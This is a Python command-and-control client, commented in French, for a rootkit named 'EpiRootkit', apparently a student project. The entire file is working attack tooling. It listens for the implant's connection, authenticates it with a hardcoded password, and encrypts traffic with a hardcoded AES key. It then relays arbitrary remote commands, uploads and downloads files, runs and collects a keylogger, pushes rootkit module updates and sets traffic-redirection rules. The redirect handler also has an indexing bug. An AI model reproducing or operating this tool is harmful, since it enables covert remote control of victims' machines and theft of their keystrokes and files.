#!/usr/bin/env python3

import socket
import threading
import sys
import os
import time
import argparse
from typing import Optional
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import padding
from datetime import datetime

class EpiRootkitClient:
    def __init__(self, host: str = '0.0.0.0', port: int = 4444):
        self.host = host
        self.port = port
        self.server_socket = None
        self.client_socket = None
        self.is_running = False
        self.password = "epita2025"
        
        # Clé de chiffrement (doit correspondre à celle du rootkit)
        self.encryption_key = bytes([
            0x00, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07,
            0x08, 0x09, 0x0A, 0x0B, 0x0C, 0x0D, 0x0E, 0x0F,
            0x10, 0x11, 0x12, 0x13, 0x14, 0x15, 0x16, 0x17,
            0x18, 0x19, 0x1A, 0x1B, 0x1C, 0x1D, 0x1E, 0x1F
        ])
        self.keylog_thread = None
        self.keylog_running = False

    def encrypt_data(self, data: bytes) -> bytes:
        """Chiffre les données avec AES-256-CBC"""
        # Générer un IV aléatoire
        iv = os.urandom(16)
        
        # Créer le cipher
        cipher = Cipher(
            algorithms.AES(self.encryption_key),
            modes.CBC(iv),
            backend=default_backend()
        )
        encryptor = cipher.encryptor()
        
        # Ajouter le padding
        padder = padding.PKCS7(algorithms.AES.block_size).padder()
        padded_data = padder.update(data) + padder.finalize()
        
        # Chiffrer
        encrypted_data = encryptor.update(padded_data) + encryptor.finalize()
        
        # Retourner l'IV + données chiffrées
        return iv + encrypted_data

    def decrypt_data(self, data: bytes) -> bytes:
        """Déchiffre les données avec AES-256-CBC"""
        if len(data) < 16:
            raise ValueError("Données trop courtes")
            
        # Extraire l'IV
        iv = data[:16]
        encrypted_data = data[16:]
        
        # Créer le cipher
        cipher = Cipher(
            algorithms.AES(self.encryption_key),
            modes.CBC(iv),
            backend=default_backend()
        )
        decryptor = cipher.decryptor()
        
        # Déchiffrer
        padded_data = decryptor.update(encrypted_data) + decryptor.finalize()
        
        # Enlever le padding
        unpadder = padding.PKCS7(algorithms.AES.block_size).unpadder()
        data = unpadder.update(padded_data) + unpadder.finalize()
        
        return data

    def send_encrypted(self, data: bytes) -> None:
        """Envoie des données chiffrées"""
        encrypted_data = self.encrypt_data(data)
        self.client_socket.sendall(encrypted_data)

    def recv_encrypted(self, bufsize: int = 4096) -> bytes:
        """Reçoit et déchiffre des données"""
        encrypted_data = self.client_socket.recv(bufsize)
        if not encrypted_data:
            return b""
        return self.decrypt_data(encrypted_data)

    def start_server(self):
        """Démarre le serveur d'attaque"""
        self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        
        try:
            self.server_socket.bind((self.host, self.port))
            self.server_socket.listen(1)
            print(f"[*] Serveur démarré sur {self.host}:{self.port}")
            
            self.is_running = True
            while self.is_running:
                try:
                    self.client_socket, addr = self.server_socket.accept()
                    print(f"[+] Connexion établie avec {addr[0]}:{addr[1]}")
                    
                    # Vérification du mot de passe
                    if self.authenticate():
                        self.handle_connection()
                    else:
                        print("[-] Échec de l'authentification")
                        self.client_socket.close()
                        
                except Exception as e:
                    print(f"[-] Erreur de connexion: {e}")
                    if self.client_socket:
                        self.client_socket.close()
                        
        except Exception as e:
            print(f"[-] Erreur lors du démarrage du serveur: {e}")
        finally:
            self.cleanup()

    def authenticate(self) -> bool:
        """Vérifie le mot de passe du rootkit"""
        try:
            self.send_encrypted(b"AUTH")
            response = self.recv_encrypted().decode().strip()
            return response == self.password
        except:
            return False

    def upload_file(self, local_path: str, remote_filename: str):
        """Upload un fichier vers le rootkit"""
        try:
            if not os.path.exists(local_path):
                print(f"[-] Fichier {local_path} non trouvé")
                return False

            filesize = os.path.getsize(local_path)
            command = f"UPLOAD {remote_filename} {filesize}"
            self.send_encrypted(command.encode())

            with open(local_path, 'rb') as f:
                data = f.read()
                self.send_encrypted(data)

            response = self.recv_encrypted().decode()
            print(response)
            return "success" in response.lower()
        except Exception as e:
            print(f"[-] Erreur lors de l'upload: {e}")
            return False

    def download_file(self, remote_filename: str, local_path: str):
        """Download un fichier depuis le rootkit"""
        try:
            command = f"DOWNLOAD {remote_filename}"
            self.send_encrypted(command.encode())

            with open(local_path, 'wb') as f:
                while True:
                    data = self.recv_encrypted()
                    if not data:
                        break
                    f.write(data)

            print(f"[+] Fichier téléchargé: {local_path}")
            return True
        except Exception as e:
            print(f"[-] Erreur lors du download: {e}")
            return False

    def start_keylogger(self):
        """Démarre le keylogger"""
        try:
            self.send_encrypted(b"KEYLOG_START")
            response = self.recv_encrypted().decode()
            print(response)
            if "started" in response.lower():
                self.keylog_running = True
                self.keylog_thread = threading.Thread(target=self.keylog_loop)
                self.keylog_thread.daemon = True
                self.keylog_thread.start()
                return True
            return False
        except Exception as e:
            print(f"[-] Erreur lors du démarrage du keylogger: {e}")
            return False

    def stop_keylogger(self):
        """Arrête le keylogger"""
        try:
            self.send_encrypted(b"KEYLOG_STOP")
            response = self.recv_encrypted().decode()
            print(response)
            if "stopped" in response.lower():
                self.keylog_running = False
                if self.keylog_thread:
                    self.keylog_thread.join(timeout=1.0)
                return True
            return False
        except Exception as e:
            print(f"[-] Erreur lors de l'arrêt du keylogger: {e}")
            return False

    def keylog_loop(self):
        """Boucle de récupération des frappes clavier"""
        while self.keylog_running:
            try:
                self.send_encrypted(b"KEYLOG_GET")
                keystrokes = self.recv_encrypted().decode()
                if keystrokes and keystrokes != "No keystrokes recorded\n":
                    print("\n=== Keystrokes ===")
                    print(keystrokes)
                    print("=================\n")
            except Exception as e:
                print(f"[-] Erreur lors de la récupération des frappes: {e}")
            time.sleep(1)

    def update_rootkit(self, module_path: str):
        """Met à jour le rootkit avec un nouveau module"""
        try:
            if not os.path.exists(module_path):
                print(f"[-] Module {module_path} non trouvé")
                return False

            filesize = os.path.getsize(module_path)
            command = f"UPDATE {filesize}"
            self.send_encrypted(command.encode())

            with open(module_path, 'rb') as f:
                data = f.read()
                self.send_encrypted(data)

            response = self.recv_encrypted().decode()
            print(response)
            return "successful" in response.lower()
        except Exception as e:
            print(f"[-] Erreur lors de la mise à jour: {e}")
            return False

    def add_redirect_rule(self, src_ip: str, dst_ip: str, src_port: int, dst_port: int, protocol: int):
        """Ajoute une règle de redirection"""
        try:
            rule = f"{src_ip}:{dst_ip}:{src_port}:{dst_port}:{protocol}"
            command = f"REDIRECT_ADD {rule}"
            self.send_encrypted(command.encode())
            response = self.recv_encrypted().decode()
            print(response)
            return "added" in response.lower()
        except Exception as e:
            print(f"[-] Erreur lors de l'ajout de la règle: {e}")
            return False

    def remove_redirect_rule(self, index: int):
        """Supprime une règle de redirection"""
        try:
            command = f"REDIRECT_REMOVE {index}"
            self.send_encrypted(command.encode())
            response = self.recv_encrypted().decode()
            print(response)
            return "removed" in response.lower()
        except Exception as e:
            print(f"[-] Erreur lors de la suppression de la règle: {e}")
            return False

    def list_redirect_rules(self):
        """Liste les règles de redirection"""
        try:
            self.send_encrypted(b"REDIRECT_LIST")
            response = self.recv_encrypted().decode()
            print("\n=== Règles de redirection ===")
            print(response)
            print("===========================\n")
            return True
        except Exception as e:
            print(f"[-] Erreur lors de la liste des règles: {e}")
            return False

    def handle_connection(self):
        """Gère la connexion avec le rootkit"""
        try:
            while self.is_running:
                command = input("epirootkit> ")
                if command.lower() == 'exit':
                    if self.keylog_running:
                        self.stop_keylogger()
                    break
                elif command.lower() == 'keylog start':
                    self.start_keylogger()
                elif command.lower() == 'keylog stop':
                    self.stop_keylogger()
                elif command.lower().startswith('redirect add '):
                    # Format: redirect add src_ip dst_ip src_port dst_port protocol
                    parts = command.split()
                    if len(parts) == 6:
                        try:
                            src_ip = parts[2]
                            dst_ip = parts[3]
                            src_port = int(parts[4])
                            dst_port = int(parts[5])
                            protocol = int(parts[6])
                            self.add_redirect_rule(src_ip, dst_ip, src_port, dst_port, protocol)
                        except ValueError:
                            print("Usage: redirect add src_ip dst_ip src_port dst_port protocol")
                    else:
                        print("Usage: redirect add src_ip dst_ip src_port dst_port protocol")
                elif command.lower().startswith('redirect remove '):
                    # Format: redirect remove index
                    parts = command.split()
                    if len(parts) == 3:
                        try:
                            index = int(parts[2])
                            self.remove_redirect_rule(index)
                        except ValueError:
                            print("Usage: redirect remove index")
                    else:
                        print("Usage: redirect remove index")
                elif command.lower() == 'redirect list':
                    self.list_redirect_rules()
                elif command.lower().startswith('update '):
                    # Format: update module_path
                    parts = command.split()
                    if len(parts) == 2:
                        self.update_rootkit(parts[1])
                    else:
                        print("Usage: update module_path")
                elif command.lower().startswith('upload '):
                    # Format: upload local_path remote_filename
                    parts = command.split()
                    if len(parts) == 3:
                        self.upload_file(parts[1], parts[2])
                    else:
                        print("Usage: upload local_path remote_filename")
                elif command.lower().startswith('download '):
                    # Format: download remote_filename local_path
                    parts = command.split()
                    if len(parts) == 3:
                        self.download_file(parts[1], parts[2])
                    else:
                        print("Usage: download remote_filename local_path")
                else:
                    self.send_encrypted(command.encode())
                    response = self.recv_encrypted().decode()
                    print(response)
                
        except Exception as e:
            print(f"[-] Erreur lors de la communication: {e}")
        finally:
            if self.client_socket:
                self.client_socket.close()

    def cleanup(self):
        """Nettoie les ressources"""
        if self.keylog_running:
            self.stop_keylogger()
        if self.client_socket:
            self.client_socket.close()
        if self.server_socket:
            self.server_socket.close()
        self.is_running = False

def main():
    parser = argparse.ArgumentParser(description='Client EpiRootkit')
    parser.add_argument('--host', default='0.0.0.0', help='Adresse IP du serveur')
    parser.add_argument('--port', type=int, default=4444, help='Port du serveur')
    
    args = parser.parse_args()
    
    client = EpiRootkitClient(args.host, args.port)
    try:
        client.start_server()
    except KeyboardInterrupt:
        print("\n[*] Arrêt du serveur...")
        client.cleanup()

if __name__ == "__main__":
    main() 